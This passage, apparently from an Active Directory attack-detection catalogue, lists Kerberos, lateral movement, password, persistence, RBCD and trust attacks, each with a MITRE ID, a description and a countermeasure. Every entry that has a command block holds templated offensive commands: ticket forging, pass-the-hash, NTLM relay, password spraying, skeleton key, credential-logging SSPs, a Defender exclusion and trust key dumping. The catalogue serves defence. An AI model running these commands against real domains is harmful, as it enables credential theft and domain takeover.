> Detects creation and use of Golden Tickets — forged TGTs signed with the krbtgt account NTLM hash. Golden tickets can impersonate any user, survive password resets, and grant arbitrary group membershi

**Commands:**
```
impacket-ticketer -nthash {krbtgt} -domain-sid {sid} -domain {dom} Administrator
```
```
Rubeus.exe golden /rc4:{krbtgt} /domain:{dom} /sid:{sid} /user:Administrator /ptt
```
```
mimikatz kerberos::golden /krbtgt:{hash} /domain:{dom} /sid:{sid} /user:Admin /ptt
```
**Detection:** Reset krbtgt password TWICE (invalidates all existing tickets)

### 🔴 [CRITICAL] Silver Ticket — Forged Service Ticket Using Service Account Hash
**MITRE:** T1558.002  |  **ID:** `kerberos-silver-ticket-001`
> Detects Silver Ticket attacks — forged TGS tickets signed with service account NTLM hash. Bypasses the KDC entirely. More stealthy than Golden Ticket as no DC authentication required.

**Commands:**
```
impacket-ticketer -nthash {svc_hash} -domain-sid {sid} -domain {dom} -spn cifs/server silverticket
```
```
mimikatz kerberos::golden /user:Admin /service:cifs /rc4:{hash} /target:srv /ptt
```
```
Rubeus.exe silver /service:cifs/{target} /rc4:{hash} /sid:{sid} /user:Admin /ptt
```
**Detection:** Rotate service account passwords regularly (use gMSA)

### 🔴 [CRITICAL] Diamond Ticket — Stealthy TGT Modification (Evades Golden Ticket Detection)
**MITRE:** T1558.001  |  **ID:** `kerberos-diamond-ticket-001`
> Diamond Ticket modifies a legitimate TGT in-memory rather than forging from scratch. Harder to detect than Golden Ticket as real TGT was requested from KDC. Rubeus diamond command uses /tgtdeleg or kr

**Commands:**
```
Rubeus.exe diamond /tgtdeleg /enctype:aes /ticketuser:Administrator /domain:{dom} /dc:{dc} /ptt
```
```
Rubeus.exe diamond /krbkey:{aes256} /user:{user} /password:{pw} /enctype:aes /ticketuser:Admin /ptt
```
**Detection:** Monitor Rubeus.exe execution (process creation events)

### 🔴 [CRITICAL] Unconstrained Delegation — TGT Capture via Coercion
**MITRE:** T1134.001  |  **ID:** `kerberos-unconstrained-delegation-001`
> Computers with Unconstrained Delegation store TGTs for all authenticating users in LSASS. Attacker coerces DC authentication to this host, captures DC's TGT, and uses it to compromise the domain.

**Commands:**
```
Rubeus.exe monitor /interval:5 /filteruser:DC$
```
```
impacket-findDelegation {dom}/{user}:{pass} -dc-ip {dc}
```
**Detection:** Remove Unconstrained Delegation from non-DC computers

### 🟠 [HIGH] Constrained Delegation S4U2Proxy Abuse
**MITRE:** T1134.001  |  **ID:** `kerberos-constrained-delegation-001`
> Abuses S4U2Self/S4U2Proxy extensions to impersonate any user to services the compromised account is allowed to delegate to. Requires control of an account with msDS-AllowedToDelegateTo attribute set.

**Commands:**
```
impacket-getST -spn cifs/{target}.{dom} -impersonate Administrator {dom}/{user}:{pass}
```
```
Rubeus.exe s4u /user:{svc} /aes256:{key} /impersonateuser:Admin /msdsspn:cifs/{target} /ptt
```
**Detection:** Audit msDS-AllowedToDelegateTo attributes

## LATERAL MOVEMENT (8 techniques)

### 🔴 [CRITICAL] PSExec-Style Lateral Movement — Remote Service Creation via SMB
**MITRE:** T1021.002  |  **ID:** `lateral-psexec-001`
> Detects PSExec-style execution via SMB IPC$ share and Windows Service Manager. Creates a random-named service, executes payload, then removes. impacket-psexec, sysinternals psexec, and Cobalt Strike u

**Commands:**
```
impacket-psexec {dom}/{user}:{pass}@{dc}
```
```
impacket-psexec {dom}/{user}@{dc} -hashes :{ntlm_hash}
```
**Detection:** Restrict admin shares (ADMIN$, C$) access

### 🟠 [HIGH] WMI Remote Command Execution — Lateral Movement
**MITRE:** T1047  |  **ID:** `lateral-wmiexec-001`
> Detects WMI-based remote command execution (impacket-wmiexec, CrackMapExec WMI). WMI semi-interactive shell spawns cmd.exe via WmiPrvSE.exe. Harder to detect than PSExec — no service creation.

**Commands:**
```
impacket-wmiexec {dom}/{user}:{pass}@{dc}
```
```
impacket-wmiexec {dom}/{user}@{dc} -hashes :{ntlm}
```
```
crackmapexec smb {dc} -u {user} -p {pass} -x 'whoami'
```
**Detection:** Disable WMI remote access via Windows Firewall

### 🟠 [HIGH] Evil-WinRM — Windows Remote Management Shell Access
**MITRE:** T1021.006  |  **ID:** `lateral-evil-winrm-001`
> Detects Evil-WinRM connections for remote PowerShell shell access. Uses WinRM (TCP 5985/5986). Supports Pass-the-Hash and certificate auth.

**Commands:**
```
evil-winrm -i {dc} -u {user} -p {pass}
```
```
evil-winrm -i {dc} -u {user} -H {ntlm_hash}
```
**Detection:** Restrict WinRM access via firewall (only from management hosts)

### 🟠 [HIGH] DCOM Remote Execution — MMC20 Application Object Abuse
**MITRE:** T1021.003  |  **ID:** `lateral-dcom-001`
> Detects DCOM-based lateral movement via MMC20.Application, ShellWindows, ShellBrowserWindow, or ExcelDDE. Leaves minimal artifacts — no service creation or WMI events.

**Commands:**
```
impacket-dcomexec {dom}/{user}:{pass}@{dc} 'whoami'
```
**Detection:** Restrict DCOM permissions via DCOMCNFG

### 🔴 [CRITICAL] Pass-the-Hash — NTLM Authentication with Stolen Hash
**MITRE:** T1550.002  |  **ID:** `lateral-pth-001`
> Detects Pass-the-Hash attacks where NTLM hash is used instead of password for authentication. Pattern: NewCredentials logon (type 9) followed by network authentication, or CrackMapExec -H flag usage.

**Commands:**
```
crackmapexec smb {dc} -u {user} -H {ntlm} -d {dom} -x 'whoami'
```
```
impacket-psexec {dom}/{user}@{dc} -hashes :{ntlm}
```
```
mimikatz sekurlsa::pth /user:{user} /domain:{dom} /ntlm:{hash} /run:powershell.exe
```
```
evil-winrm -i {dc} -u {user} -H {ntlm}
```
**Detection:** Enforce Protected Users group for privileged accounts (blocks NTLM)

### 🟠 [HIGH] WinRS Lateral Movement — Low-Footprint Remote Shell
**MITRE:** T1021.006  |  **ID:** `lateral-winrs-001`
> WinRS (winrshost.exe) provides remote shell via WinRM without creating PowerShell process. Lower detection profile than Evil-WinRM. Used in CRTP curriculum for stealthy lateral movement.

**Commands:**
```
winrs -r:{target} -u:{dom}\\{user} -p:{pass} cmd.exe
```
```
winrs -r:{target} -u:{dom}\\{user} -p:{pass} 'whoami /all'
```
**Detection:** Monitor winrshost.exe process creation events

### 🟠 [HIGH] AtExec — Scheduled Task Remote Execution
**MITRE:** T1053.005  |  **ID:** `lateral-atexec-001`
> impacket-atexec creates a remote scheduled task, executes command, retrieves output, then deletes the task. Leaves Event ID 4698 (task creation) and 4699 (task deletion) within seconds.

**Commands:**
```
impacket-atexec {dom}/{user}:{pass}@{dc} '{command}'
```
**Detection:** Monitor Event IDs 4698/4699 pairs with short intervals

### 🟠 [HIGH] RDP Access with Pass-the-Hash via xfreerdp
**MITRE:** T1021.001  |  **ID:** `lateral-rdp-pth-001`
> Detects RDP Pass-the-Hash using xfreerdp /pth flag or enabling RDP via CrackMapExec rdp module followed by restricted admin mode connection.

**Commands:**
```
crackmapexec smb {dc} -u {user} -p {pass} -M rdp -o ACTION=enable
```
```
xfreerdp /u:{user} /pth:{ntlm} /v:{dc}
```
**Detection:** Enable Network Level Authentication (NLA)

## PASSWORD ATTACKS (5 techniques)

### 🟠 [HIGH] Password Spraying — Distributed Authentication Failures
**MITRE:** T1110.003  |  **ID:** `password-spray-001`
> Password spraying uses single password against many accounts to avoid lockout. Detection pattern: many 4625 failures from same source IP, each for different username, within short timeframe.

**Commands:**
```
crackmapexec smb {dc} -u '{user_file}' -p '{spray_pass}' -d {dom} --continue-on-success --jitter 30
```
```
crackmapexec ldap {dc} -u '{user_file}' -p '{spray_pass}' -d {dom} --continue-on-success
```
```
Rubeus.exe brute /users:{file} /passwords:{file} /domain:{dom} /outfile:valid.txt
```
```
kerbrute passwordspray -d {dom} --dc {dc} {user_file} '{pass}'
```
**Detection:** Implement account lockout policy (lockout after 5-10 failures, 30 min lockout)

### 🟡 [MEDIUM] Kerbrute Username Enumeration via Kerberos Pre-Auth
**MITRE:** T1589.001  |  **ID:** `password-kerbrute-enum-001`
> Kerbrute enumerates valid usernames using Kerberos AS-REQ pre-auth errors. Valid users return different error code than invalid users, allowing enumeration without authentication. Doesn't trigger lock

**Commands:**
```
kerbrute userenum -d {dom} --dc {dc} {user_file}
```
```
kerbrute passwordspray -d {dom} --dc {dc} {user_file} '{pass}'
```
**Detection:** Rate limit Kerberos AS-REQ from single source

### 🔴 [CRITICAL] NTLM Relay via Responder — SMB Signing Bypass
**MITRE:** T1557  |  **ID:** `password-ntlm-relay-001`
> NTLM relay captures authentication from poisoned LLMNR/NBT-NS and relays it to target systems without SMB signing. Enables code execution or AD object modification without knowing the password.

**Commands:**
```
sudo responder -I eth0 -rdw
```
```
impacket-ntlmrelayx -tf {targets_file} -smb2support -c 'whoami' --output-file relay.txt
```
**Detection:** Enable SMB Signing (required) on all systems

### 🟠 [HIGH] Credential Stuffing — Breached Credential List Against AD
**MITRE:** T1110.004  |  **ID:** `password-credential-stuffing-001`
> Testing breached username:password pairs against Active Directory. Pattern similar to password spraying but with matched pairs — each account tested with its previously-breached password.

**Commands:**
```
crackmapexec smb {dc} -d {dom} --continue-on-success --no-bruteforce -u {creds_file} -p {creds_file}
```
**Detection:** Compare AD user passwords against HaveIBeenPwned database

### 🟠 [HIGH] Default Credential Testing — Common Service Account Passwords
**MITRE:** T1078.001  |  **ID:** `password-default-creds-001`
> Testing default credentials for common service accounts (admin/admin, administrator/password123, sa/sa, etc.) against SMB and other services.

**Commands:**
```
crackmapexec smb {dc} -u '{user}' -p '{default_pass}' -d {dom}
```
**Detection:** Disable default accounts (Guest, local Administrator)

## PERSISTENCE (9 techniques)

### 🔴 [CRITICAL] AdminSDHolder ACL Modification — Persistent Privileged Access
**MITRE:** T1098  |  **ID:** `persist-adminsdholder-001`
> AdminSDHolder is a template object whose DACL is propagated to all protected groups every 60 minutes by SDPropagator. Adding a backdoor ACE to AdminSDHolder grants persistent access that survives dire

**Commands:**
```
Set-DomainObjectAcl -TargetIdentity 'AdminSDHolder' -PrincipalIdentity {user} -Rights All
```
```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,...' -PrincipalIdentity {user} -Rights DCSync
```
**Detection:** Monitor Event 5136 on AdminSDHolder object

### 🔴 [CRITICAL] DSRM Account Backdoor — Remote DC Login via Directory Services Restore Mode
**MITRE:** T1078.002  |  **ID:** `persist-dsrm-001`
> DSRM (Directory Services Restore Mode) account is a local administrator on every DC. By setting DSRMAdminLogonBehavior=2, DSRM account can be used for remote network authentication — persistent DC bac

**Commands:**
```
New-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\' -Name 'DSRMAdminLogonBehavior' -Value 2
```
```
Set-DomainAccountPassword -Identity 'Administrator' -AccountPassword (ConvertTo-SecureString '{pass}' -AsPlainText -Force) -domain {dc_hostname}
```
**Detection:** Remove or reset DSRMAdminLogonBehavior to 0

### 🔴 [CRITICAL] Skeleton Key — Mimikatz LSASS Patch for Master Password
**MITRE:** T1556.001  |  **ID:** `persist-skeleton-key-001`
> Skeleton Key patches LSASS on the DC to accept any password ("skeleton key") for any domain account in addition to the real password. Non-persistent — cleared on DC reboot. Requires DA privileges.

**Commands:**
```
mimikatz misc::skeleton
```
```
Invoke-Mimi -Command '\"misc::skeleton\"'
```
**Detection:** Deploy Credential Guard (prevents LSASS patching)

### 🔴 [CRITICAL] Custom SSP Installation — mimilib Credential Logger
**MITRE:** T1547.005  |  **ID:** `persist-custom-ssp-001`
> Installing mimilib.dll as Security Support Provider (SSP) causes Windows to log all authentication credentials to C:\Windows\System32\kiwissp.log. Survives reboots as DLL registered in LSA Security Pa

**Commands:**
```
mimikatz misc::memssp  # In-memory SSP (no disk write)
```
```
Add-MpPreference -ExclusionPath C:\\Windows\\System32
```
```
reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa' /v 'Security Packages' /d 'mimilib'
```
**Detection:** Monitor registry key "Security Packages" for unauthorized DLL additions

### 🔴 [CRITICAL] SID History Injection — Hidden Domain Admin Privileges
**MITRE:** T1134.005  |  **ID:** `persist-sid-history-001`
> SID History stores SIDs from previous domain migrations. Injecting DA SID into regular user's SID History grants DA-level access without group membership — bypasses membership-based monitoring.

**Commands:**
```
mimikatz lsadump::sid /sam:{user} /new:{SID}
```
```
Set-DomainObject -Identity {user} -Set @{sIDHistory='{DA-SID}'}
```
**Detection:** Enable SID filtering on all domain trusts

### 🟠 [HIGH] WMI Event Subscription — Fileless Persistence
**MITRE:** T1546.003  |  **ID:** `persist-wmi-subscription-001`
> WMI event subscriptions (EventFilter + EventConsumer + FilterToConsumerBinding) provide fileless persistence triggered by system events. CommandLineEventConsumer executes arbitrary commands. Very stea

**Commands:**
```
Register-WMIEvent -Query 'SELECT * FROM __InstanceModificationEvent...' -Action {Start-Process powershell.exe}
```
```
New-WMISubscription -Name backdoor -Query '...' -Command 'powershell.exe'
```
**Detection:** Enable Sysmon WMI subscription logging (Event IDs 19, 20, 21)

### 🟠 [HIGH] Registry Run Key — Local Persistence
**MITRE:** T1547.001  |  **ID:** `persist-registry-runkey-001`
> Adds executable to HKCU or HKLM Run registry keys for execution at logon/startup. Classic local persistence mechanism.

**Commands:**
```
New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Updater' -Value 'C:\\payload.exe'
```
```
reg add 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' /v Updater /d C:\\payload.exe
```
**Detection:** Monitor registry Run key modifications (Event 4657)

### 🔴 [CRITICAL] Custom Network Provider — NPPSPY Credential Capture on Logon
**MITRE:** T1556  |  **ID:** `persist-network-provider-001`
> NPPSPY registers a malicious DLL as a Network Provider that receives all plaintext credentials during Windows logon. Survives reboots. Credentials written to C:\NPPSpy.txt or similar.

**Commands:**
```
Install-NetworkProvider -DllPath C:\\NPPSpy.dll
```
```
reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy' /v 'NetworkProvider' ...
```
**Detection:** Monitor NetworkProvider registry key modifications

### 🔴 [CRITICAL] Persistent Constrained Delegation — msDS-AllowedToDelegateTo Modification
**MITRE:** T1098  |  **ID:** `persist-delegation-backdoor-001`
> Attacker with GenericWrite/WriteDACL sets msDS-AllowedToDelegateTo on a controlled account to allow impersonation to sensitive services. Provides persistent impersonation path that survives password r
**Detection:** Alert on any msDS-AllowedToDelegateTo modification (Event 5136)

## RBCD ATTACKS (6 techniques)

### 🔴 [CRITICAL] RBCD Full Chain — MachineAccountQuota to Computer Account Compromise
**MITRE:** T1134.001  |  **ID:** `rbcd-full-chain-001`
> Full RBCD attack: (1) Create fake computer via MAQ, (2) Write fake computer SID to target's msDS-AllowedToActOnBehalfOfOtherIdentity, (3) Use S4U2Self to impersonate DA to target service, (4) Use S4U2

**Commands:**
```
impacket-addcomputer -computer-name '{comp}$' -computer-pass '{pass}' {dom}/{user}:{pass} -dc-ip {dc}
```
```
impacket-rbcd -f {comp} -t {victim} {dom}/{user}:{pass}
```
```
impacket-getST -spn cifs/{victim}.{dom} -impersonate Administrator {dom}/{comp}$:{comp_pass} -dc-ip {dc}
```
```
impacket-psexec {dom}/Administrator@{victim} -k -no-pass
```
**Detection:** Set MachineAccountQuota to 0 (Critical — prevents all MAQ-based RBCD)

### 🔴 [CRITICAL] RBCD via NTLM Relay — --delegate-access Flag
**MITRE:** T1557  |  **ID:** `rbcd-ntlm-relay-001`
> impacket-ntlmrelayx --delegate-access automatically performs RBCD attack during relay: creates computer account and sets RBCD on victim computer in single operation. Most automated RBCD attack path.

**Commands:**
```
impacket-ntlmrelayx -t ldap://{dc} -smb2support --delegate-access
```
**Detection:** Enable LDAP signing (prevents relay to LDAP)

### 🔴 [CRITICAL] Bronze Bit — CVE-2020-17049 Constrained Delegation Bypass
**MITRE:** T1134.001  |  **ID:** `rbcd-bronze-bit-001`
> CVE-2020-17049 (Bronze Bit) bypasses the constrained delegation restriction on forwarding non-forwardable service tickets. Allows S4U2Proxy with tickets that should not be forwardable. Patched in Nove

**Commands:**
```
impacket-getST -spn cifs/{target} -impersonate Administrator -force-forwardable {dom}/{svc}:{pass}
```
```
Rubeus.exe s4u /bronzebit /impersonateuser:Admin /msdsspn:cifs/{target} /ptt
```
**Detection:** Apply November 2020 Kerberos security updates (KB4586786)

### 🟠 [HIGH] S4U2Self — Service Account Impersonation via Protocol Transition
**MITRE:** T1134.001  |  **ID:** `rbcd-s4u2self-001`
> S4U2Self (Protocol Transition) allows a service account with trusted for delegation to request a service ticket to itself on behalf of any user. Used as first step before S4U2Proxy or standalone for t
**Detection:** Enable "Account is sensitive and cannot be delegated" for DA accounts

### 🟠 [HIGH] RBCD Cleanup — Attacker Removes Evidence (msDS-AllowedToActOnBehalfOfOtherIdentity)
**MITRE:** T1070  |  **ID:** `rbcd-cleanup-001`
> After RBCD attack, attacker cleans up by removing msDS-AllowedToActOnBehalfOfOtherIdentity and deleting fake computer account. Removal of these indicators is itself suspicious.
**Detection:** Alert on BOTH setting AND removal of delegation attributes

### 🟠 [HIGH] Powermad — New-MachineAccount Computer Creation via LDAP
**MITRE:** T1136.002  |  **ID:** `rbcd-powermad-001`
> Powermad.ps1 New-MachineAccount creates computer accounts via direct LDAP without needing local admin or Active Directory Users and Computers. Exploits MachineAccountQuota default of 10.

**Commands:**
```
Import-Module .\\Powermad.ps1; New-MachineAccount -MachineAccount {comp} -Password (ConvertTo-SecureString '{pass}' -AsPlainText -Force)
```
**Detection:** Set MachineAccountQuota = 0 (elimnates Powermad attack path)

## TRUST ATTACKS (7 techniques)

### 🟠 [HIGH] Cross-Forest Kerberoasting — Foreign Domain SPN Enumeration
**MITRE:** T1558.003  |  **ID:** `trust-cross-forest-kerberoast-001`
> Kerberoasting targeting service accounts in foreign trusted domains. Requires authentication in source domain, requests TGS for foreign domain SPNs using inter-realm ticket referral chain.

**Commands:**
```
impacket-GetUserSPNs -target-domain {trusted} {dom}/{user}:{pass} -dc-ip {dc} -request -outputfile cross_spns.txt
```
**Detection:** Enable SID Filtering on all forest trusts

### 🔴 [CRITICAL] ExtraSID Attack — Inter-Realm Golden Ticket with Parent Domain SID
**MITRE:** T1558.001  |  **ID:** `trust-extrasid-001`
> ExtraSID injects parent/target domain's Enterprise Admin SID (S-1-5-21-*-519) into the inter-realm TGT. When used against parent domain, grants EA-level access without legitimate credentials in that d

**Commands:**
```
impacket-ticketer -nthash {krbtgt_h} -domain-sid {dom_sid} -domain {dom} -extra-sid {target_sid}-519 -user-id 500 Administrator
```
```
export KRB5CCNAME=Administrator.ccache
```
```
impacket-psexec {parent_dom}/Administrator@{parent_dc} -k -no-pass
```
**Detection:** Enable SID Filtering on ALL trust relationships (breaks SID History migration — plan accordingly)

### 🔴 [CRITICAL] Trust Key Extraction — lsadump::trust for Cross-Forest Silver Ticket
**MITRE:** T1003.003  |  **ID:** `trust-key-extraction-001`
> Trust keys (Inter-Realm trust account hash) are stored in LSASS on DCs. Extraction via lsadump::trust or secretsdump enables forging of inter-realm tickets for cross-forest access.

**Commands:**
```
impacket-secretsdump {dom}/{user}:{pass}@{dc} -just-dc-ntlm | grep -i trust
```
```
mimikatz lsadump::trust /patch
```
```
Invoke-Mimi -Command '\"lsadump::trust /patch\"'
```
**Detection:** Reset trust account passwords (netdom resetpwd)

### 🔴 [CRITICAL] PAM Trust Abuse — Shadow Principals in Privileged Access Management
**MITRE:** T1484.002  |  **ID:** `trust-pam-001`
> PAM (Privileged Access Management) trust allows bastion forest security groups to have time-limited shadow memberships in production forest groups. Abuse: attacker compromises bastion forest and abuse
**Detection:** Treat bastion forest with same security as production forest

### 🟡 [MEDIUM] Domain Trust Enumeration via LDAP
**MITRE:** T1087.002  |  **ID:** `trust-enumeration-001`
> Detects LDAP enumeration of domain trust relationships via trustedDomain object class queries. Provides attack map of connected forests.

**Commands:**
```
ldapsearch -b '{base_dn}' '(objectClass=trustedDomain)' trustDirection trustPartner
```
```
nltest /domain_trusts
```
```
Get-DomainTrust
```
```
impacket-findDelegation {dom}/{user}:{pass}
```
**Detection:** Monitor bulk LDAP reads on trustedDomain objects

### 🟡 [MEDIUM] Foreign Security Principal — Cross-Domain Group Membership Enumeration
**MITRE:** T1087.002  |  **ID:** `trust-foreign-group-001`
> Foreign Security Principals (FSPs) represent accounts from trusted domains that are members of local groups. Enumeration identifies potential escalation paths via group membership in target domain.

**Commands:**
```
Get-DomainForeignGroupMember
```
```
ldapsearch -b '{target_dn}' '(member=*)' cn member
```
```
Get-DomainForeignUser
```
**Detection:** Audit foreign security principals in sensitive groups

### 🔴 [CRITICAL] Child-to-Parent Domain Escalation via SID History Injection
**MITRE:** T1134.005  |  **ID:** `trust-child-parent-001`
> Compromising child domain krbtgt allows forging inter-realm TGT with parent domain Enterprise Admin SID injected via SID history mechanism. Effectively grants EA in parent domain from child domain com

**Commands:**
```
impacket-ticketer -nthash {child_krbtgt} -domain-sid {child_sid} -domain {child_dom} -extra-sid {parent_sid}-519 Administrator
```
**Detection:** Enable SID Filtering between parent and child domains
